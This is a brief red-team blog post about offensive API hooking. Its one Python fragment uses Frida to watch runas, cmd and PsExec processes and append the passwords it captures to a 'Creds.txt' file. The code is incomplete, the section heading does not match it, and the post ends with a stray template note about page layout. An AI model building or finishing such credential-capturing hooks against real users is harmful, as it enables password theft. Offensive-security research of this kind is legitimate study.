---
title: Offensive Hooking
author: Ilan Kalendarov
date: 2021-02-10 14:10:00 +0800
categories: [Red Team]
tags: [hooking]
---

## Offensive Hooking



## Introduction

Hooking is not a new concept as we know by now, many AV/EDR vendors use this technique to monitor suspicious activity. In this blog post we'll explorer hooking but in the offensive point of view.



## API Monitor

Api Monitor is a great tool for .. you guest it, monitoring api calls.

```python
from __future__ import print_function
import frida
from time import sleep
import psutil
from threading import Lock, Thread
import sys

lockRunas = Lock()  # Locking the run as thread
lockCmd = Lock()  # locking the cmd thread
lockPsExec = Lock()  # locking the PsExec thread


def on_message_runas(message, data):
	# Executes when the user enters the password.
	# Then, open the txt file and append it
	print(message)
	if message['type'] == "send":
		with open("Creds.txt", "a") as f:
			f.write(message["payload"] + '\n')
		try:
			lockRunas.release()
			print("[+] released")
		except Exception:
			pass

```

> **Note**: The posts' ***layout*** has been set to `post` by default, so there is no need to add the variable ***layout*** in Front Matter block.



